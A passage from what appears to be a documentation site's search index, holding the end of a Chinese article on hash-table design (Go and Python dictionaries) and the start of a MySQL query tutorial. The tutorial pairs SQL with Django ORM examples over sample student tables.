line\u4e5f\u662f\u4e00\u4e2a64\u5b57\u8282\u7684\u6570\u7ec4\u3002\u4f46\u6570\u7ec4\u6709\u4e2a\u95ee\u9898\uff0c\u5373\u7d22\u5f15\u6548\u7387\u4f4e\uff0c\u6211\u4eec\u5f80\u5f80\u662f\u901a\u8fc7\u6392\u5e8f\u7136\u540e\u8fdb\u884c\u4e8c\u5206\u67e5\u627e\u6765\u63d0\u9ad8\u7d22\u5f15\u7684\u6548\u7387\u3002\u53ef\u662f\u5982\u679c\u6211\u4eec\u7684\u6570\u636e\u9700\u8981\u9891\u7e41\u7684\u7f16\u8f91(\u63d2\u5165\u3001\u5220\u9664\u3001\u4fee\u6539)\u65f6\uff0c\u8fd9\u79cd\u6392\u5e8f\u5c31\u53ef\u80fd\u9020\u6210\u6211\u4eec\u9700\u8981\u9891\u7e41\u7684\u5bf9\u5176\u4e2d\u7684\u5c40\u90e8\u8fdb\u884c\u91cd\u6392\uff0c\u8fd9\u65f6\u5019\u5ef6\u4f38\u51fa\u4e86\u5927\u5c0f\u5806\u3001\u6811\u5806\u7b49\u5404\u79cd\u5404\u6837\u7684\u7ed3\u6784\u6765\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u3002\u5176\u4e2d\u6709\u4e00\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u4eca\u5929\u8981\u63d0\u5230\u7684\u5b57\u5178(map/dict)\uff0c\u5b83\u5728\u5404\u65b9\u9762\u6548\u7387\u505a\u5230\u4e86\u5f88\u597d\u7684\u5e73\u8861\uff0c\u5b83\u7684\u7ecf\u5178\u5b9e\u73b0\u65b9\u5f0f\u662fhash table\uff0c\u4e5f\u6709\u5f88\u591a\u5176\u5b83\u5b9e\u73b0\u65b9\u5f0f\uff0c\u4f46\u4e0d\u7ba1\u662f\u600e\u6837\u5b9e\u73b0\u7684\uff0c\u6620\u5c04\u5728\u5185\u5b58\u5c42\u9762\u4ecd\u7136\u662f\u6570\u7ec4\uff0c\u90a3\u4e48\u5b83\u662f\u600e\u6837\u5b9e\u73b0\u7684\u5462\uff1f</p> <p>\u9996\u5148\uff0c\u6211\u4eec\u4e0d\u8003\u8651value\uff0c\u4ec5\u770bkey\u662f\u600e\u4e48\u6620\u5c04\u5230\u6570\u7ec4\u4e0a\u7684\u3002\u6570\u7ec4\u901a\u8fc7\u4e0b\u6807\u6570\u5b57\u8bbf\u95ee\uff0c\u4e0d\u7ba1key\u662f\u4ec0\u4e48\u7c7b\u578b\uff0c\u6211\u4eec\u90fd\u9700\u8981\u628a\u5b83\u901a\u8fc7\u54c8\u5e0c\u51fd\u6570\u8f6c\u6362\u4e3a\u4e00\u4e2a\u6570\u5b57\uff0c\u82e5\u5f97\u5230\u7684\u6570\u5b57\u5f88\u5927\u8d85\u8fc7\u4e86\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u53d6\u6a21(n%len)\u7684\u65b9\u5f0f\u6765\u5f97\u5230\u5b83\u5728\u6570\u7ec4\u4e2d\u7684\u4f4d\u7f6e\u3002\u6240\u4ee5\u4efb\u4f55\u4e00\u4e2a\u53ef\u54c8\u5e0c\u7684Key\u6211\u4eec\u90fd\u80fd\u628a\u5b83\u6620\u5c04\u5230\u6570\u7ec4\u4e0a\u7684\u67d0\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u628akey-value\u6253\u5305\u4e3a\u4e00\u4e2astruct\u653e\u5728\u6570\u7ec4\u4e2d\u67d0\u4e2a\u4f4d\u7f6e\uff0c\u89e3\u51b3\u4e86\u9ad8\u6548\u7684\u67e5\u627e\u548c\u7f16\u8f91\u7684\u95ee\u9898\u3002</p> <p>\u63a5\u4e0b\u6765\u7684\u95ee\u9898\u5c31\u662f\u54c8\u5e0c\u78b0\u649e\u4e86\u3002\u5f53\u4e24\u4e2akey\u54c8\u5e0c\u5e76\u53d6\u6a21\u540e\u7684\u7ed3\u679c\u662f\u76f8\u540c\u7684\u6570\u5b57\u65f6\uff0c\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u5904\u7406\u65b9\u5f0f\u5c31\u662f\u7528\u94fe\u8868\u94fe\u8d77\u6765\uff0c\u5373\u94fe\u8868\u6cd5\uff0c\u628a\u4e00\u4e2a\u6a2a\u5411\u7684\u5927\u7684\u6570\u7ec4\u8f6c\u5316\u4e3a\u4e86\u591a\u4e2a\u7eb5\u5411\u7684\u5c0f\u7684\u94fe\u8868\uff0cGo\u91c7\u7528\u7684\u8fd9\u79cd\u65b9\u5f0f\u3002\u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\u5c31\u662f\u82e5\u53d1\u73b0\u51b2\u7a81\uff0c\u5219\u628a\u65b0\u7684key\u52a0\u4e0a\u4e00\u4e2amagic_number\u8ba1\u7b97\u5f97\u51fa\u4e00\u4e2a\u65b0\u7684\u4f4d\u7f6e\uff0c\u6a2a\u5411\u7684\u586b\u5145\u5230\u8fd9\u4e2a\u7a7a\u4f4d\uff0c\u79f0\u4e3a\u5f00\u653e\u5bfb\u5740\u6cd5\uff0cPython\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\u3002</p> <p>\u94fe\u8868\u6cd5\u7684\u95ee\u9898\u5c31\u5728\u4e8e\u94fe\u8868\u7684\u8bbf\u95ee\u6548\u7387\u5dee\uff0c\u5982\u4f55\u4f18\u5316\uff1f\u5f53CPU\u53bb\u8bfb\u53d6\u6570\u636e\u65f6\uff0c\u5b83\u4f1a\u57fa\u4e8e\u7a7a\u95f4\u5c40\u90e8\u6027\u539f\u5219\u5c06\u9644\u8fd1\u7684\u6570\u636e\u4ece\u5185\u5b58\u8bfb\u5165L3\uff0c\u7136\u540e\u662fL2\u3001L1\u3002\u90a3\u4e48\u6211\u4eec\u57fa\u4e8e\u8fd9\u4e2a\u539f\u5219\uff0c\u5e94\u5f53\u628a\u94fe\u8868\u8f6c\u6362\u4e3a\u6570\u7ec4\uff0c\u628a\u539f\u6709\u7684\u4e00\u4e2a\u4e2a\u7684item\u653e\u5165\u4e00\u4e2a\u6876\u4e2d:</p> <p></p> <p>\u628a\u6bcf8(\u62168\u7684\u500d\u6570)\u4e2aitem\u5f53\u505a\u4e00\u4e2a\u6876\uff0c\u4e00\u4e2a\u6876\u94fe\u63a5\u53e6\u4e00\u4e2a\u6876\u3002\u5f53\u6211\u4eec\u9700\u8981\u6839\u636e\u67d0\u4e2a\u67e5\u8be2\u6761\u4ef6\u67e5\u8be2\u6570\u636e\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u6574\u4e2a\u6876\u62ff\u51fa\u6765\u904d\u5386\u67e5\u627e\uff0c\u5f88\u53ef\u80fd\u6574\u4e2a\u6876\u662f\u88abL1\u6216\u8005L3\u7f13\u5b58\u8fc7\u7684\uff0c\u8fd9\u4e2a\u8bbf\u95ee\u6548\u7387\u5c31\u53ef\u80fd\u6bd4\u5728\u5185\u5b58\u4e2d\u53bb\u8bfb\u53d6\u5feb\u4e0a\u767e\u500d\u3002</p> <p>\u90a3\u4e48\u9488\u5bf9\u8fd9\u4e2a\u6876\u662f\u5426\u8fd8\u6709\u4f18\u5316\u7a7a\u95f4\u5462\uff1f\u6211\u4eec\u53d1\u73b0\u904d\u5386\u7684\u65f6\u5019\u662f\u53bb\u5224\u65ad\u5b83\u7684key\u662f\u5426\u76f8\u7b49\uff0c\u5e76\u4e0d\u9700\u8981\u77e5\u9053\u5b83\u7684value\u3002\u6309\u7167\u5f53\u524d\u8fd9\u79cd\u7ed3\u6784value\u5c31\u5360\u7528\u4e86\u7f13\u5b58\u5668\u7684\u7a7a\u95f4:</p> <p></p> <p>\u6211\u4eec\u5e94\u8be5\u5c3d\u53ef\u80fd\u7684\u7f13\u5b58\u66f4\u591a\u7684keys\uff0c\u4e8e\u662f\u53ef\u4ee5\u628a\u6876\u5206\u4e3a\u4e0a\u4e0b\u4e24\u4e2a\u90e8\u5206:</p> <p></p> <p>\u90a3\u4e48\u8fd8\u80fd\u8fdb\u4e00\u6b65\u4f18\u5316\u5417\uff1f\u6211\u4eec\u53d1\u73b0keys\u7684\u6570\u636e\u7c7b\u578b\u4e0d\u77e5\u9053\uff0c\u5982\u679c\u662f\u4e2a\u6574\u6570\u5012\u8fd8\u5f88\u5bb9\u6613\u548c\u67e5\u8be2\u6761\u4ef6\u505a\u6bd4\u8f83\uff0c\u4f46\u82e5\u662f\u4e2a\u5b57\u7b26\u4e32\uff0c\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83\u6548\u7387\u662f\u975e\u5e38\u4f4e\u7684\u3002\u9488\u5bf9\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u505a\u4e00\u5c42\u8bbf\u95ee\u62e6\u622a:</p> <p></p> <p>\u8fd9\u5c42\u6570\u7ec4\u653e\u5165keys\u7684\u54c8\u5e0c\u503c\uff0c\u53ea\u6709\u5f53\u67d0\u4e2a\u4f4d\u7f6e\u7684\u54c8\u5e0c\u503c\u548c\u67e5\u8be2\u6761\u4ef6\u5339\u914d\u65f6\uff0c\u6211\u4eec\u624d\u4f1a\u53bb\u8fdb\u4e00\u6b65\u6bd4\u5bf9keys\u6570\u7ec4\u4e2d\u5bf9\u5e94\u4f4d\u7f6e\u7684key\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u901a\u8fc7\u4e00\u4e2a\u6574\u6570\u578b\u6570\u7ec4\u62e6\u622a\u6389\u4e86\u5f88\u591a\u7684\u9884\u5224\u3002\u751a\u81f3\u8fd9\u4e2a\u6574\u6570\u6570\u7ec4\u4e5f\u65e0\u9700\u4f7f\u7528int64\uff0c\u6211\u4eec\u53ea\u53d6hashcode\u7684\u9ad8\u4f4d\u6784\u6210\u4e00\u4e2aint8\u7c7b\u578b\uff0c[8]int8\u5f62\u6210\u4e00\u4e2a64\u4f4d\u7684\u6570\u7ec4\u6b63\u597d\u80fd\u88ab\u4e00\u4e2a\u5bc4\u5b58\u5668\u5b58\u4e0b\u3002</p> <p>\u53e6\u5916\u8fd9\u5c42\u6570\u7ec4\u50cf\u4e00\u4e2a\u4f4d\u56fe\uff0c\u8fd8\u80fd\u7528\u6765\u5224\u65ad\u8fd9\u4e2a\u6876\u4e2d\u8fd8\u6709\u6ca1\u6709\u7a7a\u4f4d\uff0c\u63d2\u5165\u6570\u636e\u65f6\u5148\u770b\u6570\u7ec4\u4e2d\u662f\u5426\u6709\u7a7a\u4f4d\u5c31\u53ef\u4ee5\u76f8\u5e94\u7684\u5728keys\u548cvalues\u4e2d\u627e\u5230\u7a7a\u4f4d\uff0c\u5220\u9664\u6570\u636e\u65f6\u4e5f\u4e0d\u4f1a\u8fdb\u884c\u6536\u7f29\uff0c\u53ea\u662f\u5728\u76f8\u5e94\u7684\u4f4d\u7f6e\u4e0a\u505a\u6807\u8bb0\u3002</p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u7ecf\u8fc7\u4e00\u5c42\u5c42\u7684\u4f18\u5316\uff0c\u5b57\u5178\u53d8\u6210\u4e86\u8fd9\u4e2a\u6837\u5b50:</p> <p></p> <p>\u53ea\u8981\u54c8\u5e0c\u7b97\u6cd5\u5206\u5e03\u7684\u5f88\u5e73\u5747\uff0c\u90a3\u4e48\u57fa\u7840\u6570\u7ec4\u8d8a\u957f\uff0c\u6876\u7684\u94fe\u8868\u5c31\u8d8a\u77ed\uff0c\u8bbf\u95ee\u6548\u7387\u4e5f\u8d8a\u9ad8\uff0c\u8fd9\u5c31\u6d89\u53ca\u5230\u4e00\u4e2a\u6269\u5bb9\u7684\u95ee\u9898\u3002\u968f\u7740\u6570\u636e\u7684\u63d2\u5165\uff0c\u952e\u503c\u5bf9\u7684\u603b\u4e2a\u6570\u548c\u57fa\u7840\u6570\u7ec4\u7684\u957f\u5ea6\u6709\u4e00\u4e2a\u6bd4\u4f8b\uff0c\u5f53\u8fd9\u4e2a\u6bd4\u4f8b\u8fbe\u5230\u4e00\u4e2a\u9608\u503c\uff0c\u5c31\u4f1a\u89e6\u53d1\u6269\u5bb9\u64cd\u4f5c\u3002\u6269\u5bb9\u65f6\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u65b0\u5efa\u4e2a\u57fa\u7840\u6570\u7ec4\uff0c\u7136\u540e\u628a\u539f\u6570\u7ec4\u6570\u636e\u4e00\u6b21\u6027\u642c\u8fc7\u53bb\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4f1a\u5bfc\u81f4\u67d0\u6b21\u64cd\u4f5c\u7684\u65f6\u95f4\u8fc7\u957f\u4f7f\u5e94\u7528\u5361\u6b7b\u3002\u800c\u5e94\u8be5\u5728\u89e6\u53d1\u65f6\uff0c\u8bbe\u5b9a\u4e00\u4e2a\u6807\u5fd7\uff0c\u4e4b\u540e\u5bf9\u8fd9\u4e2a\u5b57\u5178\u7684\u6bcf\u6b21\u67e5\u8be2\u3001\u4fee\u6539\u3001\u63d2\u5165\u3001\u5220\u9664\u90fd\u5148\u53bb\u68c0\u67e5\u8fd9\u4e2a\u6807\u5fd7\uff0c\u82e5\u6807\u5fd7\u4e3a\u771f\u4e14\u672c\u6b21\u64cd\u4f5c\u7684\u6570\u636e\u5728\u65e7\u5b57\u5178\u4e2d\uff0c\u5219\u5c06\u5b83\u53ca\u9644\u8fd1\u7684\u4e00\u6bb5\u6570\u636e\u90fd\u8fc1\u79fb\u81f3\u65b0\u5b57\u5178\uff0c\u8fd9\u53eb\u200b\u968f\u673a\u8fc1\u79fb\u3002\u540c\u65f6\uff0c\u4e3a\u9632\u6b62\u6bcf\u6b21\u64cd\u4f5c\u90fd\u53d1\u751f\u5728\u65b0\u5b57\u5178\u4e2d\uff0c\u5176\u5185\u90e8\u8fd8\u6709\u4e2a\u8ba1\u6570\u5668\uff0c\u8ba9\u5176\u8fc1\u79fb\u65f6\u80fd\u591f\u4ece\u65e7\u5b57\u5178\u7684\u5934\u90e8\u518d\u987a\u5e8f\u8fc1\u79fb\u4e00\u90e8\u5206\u6570\u636e\uff0c\u4e5f\u5c31\u662f\u200b\u987a\u5e8f\u8fc1\u79fb\u3002\u8fd9\u6837\u5c31\u80fd\u4fdd\u8bc1\u6240\u6709\u7684\u6570\u636e\u90fd\u88ab\u8fc1\u79fb\u8fc7\u53bb\uff0c\u8fc1\u79fb\u5b8c\u6210\u540e\uff0c\u65e7\u5b57\u5178\u6574\u4e2a\u88ab\u91ca\u653e\u6389\u3002</p> <p>\u5f53\u5220\u9664\u5b57\u5178\u5143\u7d20\u65f6\uff0c\u5bf9\u4e8eGo\u8fd9\u79cd\u5173\u6ce8\u6027\u80fd\u7684\u8bed\u8a00\uff0c\u5b57\u5178\u7684\u5185\u5b58\u4e0d\u4f1a\u88ab\u538b\u7f29\uff0c\u53ef\u80fd\u4f1a\u9020\u6210\u5185\u5b58\u6d6a\u8d39\u3002\u5982\u679c\u6709\u5927\u91cf\u5220\u9664\u5143\u7d20\u7684\u60c5\u51b5\uff0c\u53ea\u80fd\u65b0\u5efa\u4e00\u4e2a\u5b57\u5178\uff0c\u628a\u65e7\u5b57\u5178\u7684\u6570\u636e\u624b\u5de5\u642c\u8fc7\u53bb\uff0c\u8ba9\u5783\u573e\u56de\u6536\u5668\u56de\u6536\u65e7\u5b57\u5178\u3002\u57fa\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u6211\u4eec\u5728\u6876\u4e2d\u5e94\u8be5\u53bb\u5b58\u50a8keys\u548cvalues\u7684\u5185\u5bb9\u800c\u4e0d\u662f\u5b83\u4eec\u7684\u6307\u9488\u3002\u56e0\u4e3akey\u548cvalue\u7684\u751f\u547d\u5468\u671f\u662f\u548c\u6574\u4e2amap\u76f8\u540c\u7684\uff0c\u4e0d\u5b58\u6307\u9488\u4e5f\u5c31\u610f\u5473\u7740\u51cf\u8f7b\u4e86\u5783\u573e\u56de\u6536\u671f\u7684\u538b\u529b\uff0c\u539f\u672c\u9700\u8981\u68c0\u67e5\u56de\u65361(map)+n(keys)+n(values)\u4e2a\u5bf9\u8c61\u53d8\u4e3a\u4e86\u53ea\u9700\u68c0\u67e51\u4e2amap\u5bf9\u8c61\u3002\u6240\u4ee5Go\u4e2d\u505a\u4e86\u5982\u4e0b\u8bbe\u5b9a\uff0c\u5982\u679ckey\u548cvalue\u7684\u957f\u5ea6\u5c0f\u4e8e128\u5b57\u8282\uff0c\u540c\u65f6key\u548cvalue\u672c\u8eab\u4e0d\u662f\u6307\u9488\uff0c\u90a3\u4e48\u5b83\u4eec\u4f1a\u88ab\u5d4c\u5165\u5230\u5b57\u5178\u5185\u90e8\u3002</p> <p>\u901a\u8fc7\u4ee5\u4e0a\uff0c\u6211\u4eec\u4e86\u89e3\u5230\u4efb\u4f55\u4e00\u4e2a\u770b\u4f3c\u7b80\u5355\u7684\u4e1c\u897f\u80cc\u540e\u53ef\u80fd\u90fd\u9690\u85cf\u4e86\u590d\u6742\u7684\u8bbe\u8ba1\u3002</p>"},{"location":"mysql/query/","title":"MySQL\u5e38\u7528\u67e5\u8be2\u6574\u7406","text":""},{"location":"mysql/query/#_1","title":"\u6570\u636e\u51c6\u5907","text":"<p>1\u3001\u521b\u5efa\u8868\u683c:</p> MySQLDjango ORM <pre><code>CREATE TABLE student_info (\n    number INT PRIMARY KEY,\n    name VARCHAR(5),\n    sex ENUM('\u7537', '\u5973'),\n    id_number CHAR(18),\n    department VARCHAR(30),\n    major VARCHAR(30),\n    enrollment_time DATE,\n    UNIQUE KEY (id_number)\n);\n\nCREATE TABLE student_score (\n    number INT,\n    subject VARCHAR(30),\n    score TINYINT,\n    PRIMARY KEY (number, subject),\n    CONSTRAINT FOREIGN KEY(number) REFERENCES student_info(number)\n);\n</code></pre> <pre><code>class StudentInfo(models.Model):\n    number = models.IntegerField(primary_key=True)\n    name = models.CharField(max_length=5)\n    sex = models.CharField(choices=[('\u7537', '\u7537'),('\u5973', '\u5973')], max_length=2)\n    id_number = models.CharField(max_length=18, unique=True)\n    department = models.CharField(max_length=30)\n    major = models.CharField(max_length=30)\n    enrollment_time = models.DateField()\n\n    class Meta:\n        db_table = \"student_info\"\n        managed = False\n\n\nclass StudentScore(models.Model):\n    number = models.ForeignKey(StudentInfo, db_column='number', on_delete=models.DO_NOTHING)\n    subject = models.CharField(max_length=30)\n    score = models.SmallIntegerField()\n\n    class Meta:\n        db_table = \"student_score\"\n        managed = False\n</code></pre> <p>2\u3001\u586b\u5145\u6570\u636e: <pre><code>INSERT INTO student_info(number, name, sex, id_number, department, major, enrollment_time) VALUES\n(20180101, '\u675c\u5b50\u817e', '\u7537', '158177199901044792', '\u8ba1\u7b97\u673a\u5b66\u9662', '\u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b', '2018-09-01'),\n(20180102, '\u675c\u7426\u71d5', '\u5973', '151008199801178529', '\u8ba1\u7b97\u673a\u5b66\u9662', '\u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b', '2018-09-01'),\n(20180103, '\u8303\u7edf', '\u7537', '17156319980116959X', '\u8ba1\u7b97\u673a\u5b66\u9662', '\u8f6f\u4ef6\u5de5\u7a0b', '2018-09-01'),\n(20180104, '\u53f2\u73cd\u9999', '\u5973', '141992199701078600', '\u8ba1\u7b97\u673a\u5b66\u9662', '\u8f6f\u4ef6\u5de5\u7a0b', '2018-09-01'),\n(20180105, '\u8303\u5251', '\u7537', '181048199308156368', '\u822a\u5929\u5b66\u9662', '\u98de\u884c\u5668\u8bbe\u8ba1', '2018-09-01'),\n(20180106, '\u6731\u9038\u7fa4', '\u7537', '197995199501078445', '\u822a\u5929\u5b66\u9662', '\u7535\u5b50\u4fe1\u606f', '2018-09-01');\n\nINSERT INTO student_score (number, subject, score) VALUES\n(20180101, '\u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406', 78),\n(20180101, '\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907', 88),\n(20180102, '\u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406', 100),\n(20180102, '\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907', 98),\n(20180103, '\u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406', 59),\n(20180103, '\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907', 61),\n(20180104, '\u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406', 55),\n(20180104, '\u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907', 46);\n</code></pre></p> <p>3\u3001\u586b\u5145\u7ed3\u679c:</p> <p>student_info\u8868</p> number \u00a0name\u00a0 sex id_number department \u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0major\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 enrollment_time 20180101 \u675c\u5b50\u817e \u7537 158177199901044792 \u8ba1\u7b97\u673a\u5b66\u9662 \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b 2018-09-01 20180102 \u675c\u7426\u71d5 \u5973 151008199801178529 \u8ba1\u7b97\u673a\u5b66\u9662 \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b 2018-09-01 20180103 \u8303\u7edf \u7537 17156319980116959X \u8ba1\u7b97\u673a\u5b66\u9662 \u8f6f\u4ef6\u5de5\u7a0b 2018-09-01 20180104 \u53f2\u73cd\u9999 \u5973 141992199701078600 \u8ba1\u7b97\u673a\u5b66\u9662 \u8f6f\u4ef6\u5de5\u7a0b 2018-09-01 20180105 \u8303\u5251 \u7537 181048199308156368 \u822a\u5929\u5b66\u9662 \u98de\u884c\u5668\u8bbe\u8ba1 2018-09-01 20180106 \u6731\u9038\u7fa4 \u7537 197995199501078445 \u822a\u5929\u5b66\u9662 \u7535\u5b50\u4fe1\u606f 2018-09-01 <p>student_score\u8868 </p> number subject score 20180101 \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406 78 20180101 \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907 88 20180102 \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406 100 20180102 \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907 98 20180103 \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406 59 20180103 \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907 61 20180104 \u6bcd\u732a\u7684\u4ea7\u540e\u62a4\u7406 55 20180104 \u8bba\u8428\u8fbe\u59c6\u7684\u6218\u4e89\u51c6\u5907 46"},{"location":"mysql/query/#_2","title":"\u57fa\u7840\u67e5\u8be2","text":""},{"location":"mysql/query/#_3","title":"\u522b\u540d","text":"<ul> <li>\u65b9\u5f0f\u4e00:<code>select number as \u5b66\u53f7 from student_score</code></li> <li>\u65b9\u5f0f\u4e8c:<code>select number \u5b66\u53f7 from student_score</code> </li> </ul> <p>\u67e5\u8be2\u7ed3\u679c:</p> MySQLDjango ORM <pre><code>mysql&gt; select number \u5b66\u53f7, name \u59d3\u540d from student_info;\n</code></pre> <pre><code># \u65b9\u5f0f\u4e00\nStudentInfo.objects.annotate(\u5b66\u53f7=F('number'),\u59d3\u540d=F('name')).values('\u5b66\u53f7','\u59d3\u540d')\n# \u65b9\u5f0f\u4e8c\nStudentInfo.objects.extra(select={'\u5b66\u53f7':'number', '\u59d3\u540d':'name'}).values('\u59d3\u540d','\u5b66\u53f7')\n</code></pre> result<pre><code>+----------+-----------+\n| \u5b66\u53f7     | \u59d3\u540d      |\n+----------+-----------+\n| 20180101 | \u675c\u5b50\u817e    |\n| 20180102 | \u675c\u7426\u71d5    |\n| 20180103 | \u8303\u7edf      |\n| 20180104 | \u53f2\u73cd\u9999    |\n| 20180105 | \u8303\u5251      |\n| 20180106 | \u6731\u9038\u7fa4    |\n+----------+-----------+\n6 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_4","title":"\u53bb\u91cd","text":"<p>\u5355\u5217\u53bb\u91cd: <pre><code>mysql&gt; select distinct department from student_info;\n+-----------------+\n| department      |\n+-----------------+\n| \u8ba1\u7b97\u673a\u5b66\u9662      |\n| \u822a\u5929\u5b66\u9662        |\n+-----------------+\n2 rows in set (0.00 sec)\n</code></pre></p> <p>\u591a\u5217\u53bb\u91cd:</p> MySQLDjango ORM <pre><code>mysql&gt; select distinct department,major from student_info;\n</code></pre> <pre><code>StudentInfo.objects.values('department').distinct()\nStudentInfo.objects.values('department','major').distinct()\n</code></pre> result<pre><code>+-----------------+--------------------------+\n| department      | major                    |\n+-----------------+--------------------------+\n| \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         |\n| \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b                 |\n| \u822a\u5929\u5b66\u9662        | \u98de\u884c\u5668\u8bbe\u8ba1               |\n| \u822a\u5929\u5b66\u9662        | \u7535\u5b50\u4fe1\u606f                 |\n+-----------------+--------------------------+\n4 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_5","title":"\u9650\u5236\u67e5\u8be2\u7ed3\u679c\u6761\u6570","text":"<p>\u4f7f\u7528<code>limit \u4ece\u54ea\u5f00\u59cb\uff0c\u591a\u5c11\u6761</code>\uff0c<code>\u4ece\u54ea\u5f00\u59cb</code>\u53ef\u4ee5\u7701\u7565\uff0c\u7701\u7565\u4ee3\u8868\u7b2c0\u884c\u3002</p> MySQLDjango ORM <pre><code>mysql&gt; select * from student_info limit 3,2;\n</code></pre> <pre><code>StudentInfo.objects.all()[3:5]\n</code></pre> result<pre><code>+----------+-----------+------+--------------------+-----------------+-----------------+-----------------+\n| number   | name      | sex  | id_number          | department      | major           | enrollment_time |\n+----------+-----------+------+--------------------+-----------------+-----------------+-----------------+\n| 20180104 | \u53f2\u73cd\u9999    | \u5973   | 141992199701078600 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b        | 2018-09-01      |\n| 20180105 | \u8303\u5251      | \u7537   | 181048199308156368 | \u822a\u5929\u5b66\u9662        | \u98de\u884c\u5668\u8bbe\u8ba1      | 2018-09-01      |\n+----------+-----------+------+--------------------+-----------------+-----------------+-----------------+\n2 rows in set (0.00 sec)\n</code></pre>"},{"location":"mysql/query/#_6","title":"\u6392\u5e8f","text":"<p>\u591a\u5217\u6392\u5e8f:</p> MySQLDjango ORM <pre><code>mysql&gt; select * from student_info order by name asc, number desc;\nmysql&gt; select * from student_info order by name desc, number desc;\n</code></pre> <pre><code>StudentInfo.objects.order_by('name', '-number')\nStudentInfo.objects.order_by('-name', '-number')\n</code></pre> result<pre><code>+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n| number   | name      | sex  | id_number          | department      | major                    | enrollment_time |\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n| 20180104 | \u53f2\u73cd\u9999    | \u5973   | 141992199701078600 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b                 | 2018-09-01      |\n| 20180106 | \u6731\u9038\u7fa4    | \u7537   | 197995199501078445 | \u822a\u5929\u5b66\u9662        | \u7535\u5b50\u4fe1\u606f                 | 2018-09-01      |\n| 20180101 | \u675c\u5b50\u817e    | \u7537   | 158177199901044792 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         | 2018-09-01      |\n| 20180102 | \u675c\u7426\u71d5    | \u5973   | 151008199801178529 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         | 2018-09-01      |\n| 20180105 | \u8303\u5251      | \u7537   | 181048199308156368 | \u822a\u5929\u5b66\u9662        | \u98de\u884c\u5668\u8bbe\u8ba1               | 2018-09-01      |\n| 20180103 | \u8303\u7edf      | \u7537   | 17156319980116959X | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b                 | 2018-09-01      |\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n6 rows in set (0.00 sec)\n\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n| number   | name      | sex  | id_number          | department      | major                    | enrollment_time |\n+----------+-----------+------+--------------------+-----------------+--------------------------+-----------------+\n| 20180103 | \u8303\u7edf      | \u7537   | 17156319980116959X | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8f6f\u4ef6\u5de5\u7a0b                 | 2018-09-01      |\n| 20180105 | \u8303\u5251      | \u7537   | 181048199308156368 | \u822a\u5929\u5b66\u9662        | \u98de\u884c\u5668\u8bbe\u8ba1               | 2018-09-01      |\n| 20180102 | \u675c\u7426\u71d5    | \u5973   | 151008199801178529 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         | 2018-09-01      |\n| 20180101 | \u675c\u5b50\u817e    | \u7537   | 158177199901044792 | \u8ba1\u7b97\u673a\u5b66\u9662      | \u8ba1\u7b97\u673a\u79d1\u5b66\u4e0e\u5de5\u7a0b         | 2018-09-01      |\n| 20180106 | \u6731\u9038\u7fa4    | \u7537   | 197995199501078445 | \u822a\u5929\u5b66\u9662        | 